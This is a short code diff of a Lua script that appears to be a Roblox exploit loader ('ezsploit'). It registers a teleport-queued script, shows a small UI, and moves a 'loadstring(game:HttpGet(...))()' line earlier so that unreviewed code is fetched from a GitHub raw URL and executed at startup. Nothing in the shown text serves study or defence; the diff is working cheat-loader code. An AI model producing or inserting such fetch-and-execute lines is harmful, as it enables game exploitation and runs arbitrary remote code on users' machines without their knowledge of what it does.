@@ -9,6 +9,7 @@ local telscrt = [[
 
 queueonteleport(telscrt)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mikusgszyp/ezsploitfiledownloader/main/internal.lua", true))()
 
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
@@ -39,7 +40,7 @@ wait(2.5)
 
 _1.Text = "'insert' to open UI"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/mikusgszyp/ezsploitfiledownloader/main/internal.lua", true))()
+
 
 wait(2.5)
 Frame:Destroy()
